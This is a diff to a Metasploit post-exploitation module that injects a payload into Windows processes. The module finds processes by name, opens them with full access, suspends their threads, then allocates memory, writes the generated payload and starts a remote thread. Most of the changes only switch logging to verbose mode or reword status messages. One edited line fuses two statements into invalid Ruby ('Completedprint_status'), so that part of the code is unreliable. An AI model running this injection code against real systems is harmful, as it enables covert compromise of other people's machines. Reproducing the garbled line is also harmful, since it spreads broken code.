@@ -84,7 +84,6 @@ class Metasploit3 < Msf::Post
 		#undo = datastore['UNSUSPEND']
 		tempdir = session.fs.file.expand_path("%TEMP%") || "C:\\"
 		if datastore['USE_DLL']
-			# TODO:  validate this the fancy way using OptPath.valid?
 			if @@suspender.valid?(datastore['SUSPENDER_DLL'])
 				suspender = datastore['SUSPENDER_DLL']
 			else
@@ -136,7 +135,7 @@ class Metasploit3 < Msf::Post
 			pid = client.sys.process[process] # returns first process encountered w/this name
 			if pid 
 				pids << pid
-				print_status "Found PID:  #{pid}"
+				vprint_status "Found PID:  #{pid}"
 			else
 				check_halt "Could not find a process with the name #{process}..."
 			end
@@ -185,9 +184,9 @@ class Metasploit3 < Msf::Post
 		begin
 			pids.each do |pid|
 				select(nil, nil, nil, delay)
-				print_status "Opening target process:  #{pid}"
+				print_status("Targeting process with PID #{pid}...")
 				targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
-				print_status "Suspending threads"
+				vprint_status "Suspending threads"
 				targetprocess.thread.each_thread do |x|
     				targetprocess.thread.open(x).suspend
 				end
@@ -210,7 +209,7 @@ class Metasploit3 < Msf::Post
 			raw = pay.generate
 		rescue RuntimeError => e
 			print_error("Error generating payload #{e.to_s}, can't continue.")
-			raise Rex::Script::Completed
+			raise Rex::Script::Completedprint_status("Opening process with PID #{pid}...")
 		end
 		begin
 			# Upload suspender to target
@@ -227,12 +226,12 @@ class Metasploit3 < Msf::Post
 		proc = nil
 		pids.each do |pid|
 			begin
-				print_status("Opening process with PID #{pid}...")
+				print_status("Targeting process with PID #{pid}...")
 				targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
 				mem = targetprocess.memory.allocate(raw.length + (raw.length % 1024))
-				print_status("Injecting payload")
+				vprint_status("Injecting payload")
 				targetprocess.memory.write(mem, raw)
-				print_status("Executing payload")
+				vprint_status("Executing payload")
 				targetprocess.thread.create(mem, 0)
 			rescue Rex::Post::Meterpreter::RequestError => e
 				print_error "Error injecting payload {e.to_s}, you may not have permission..."
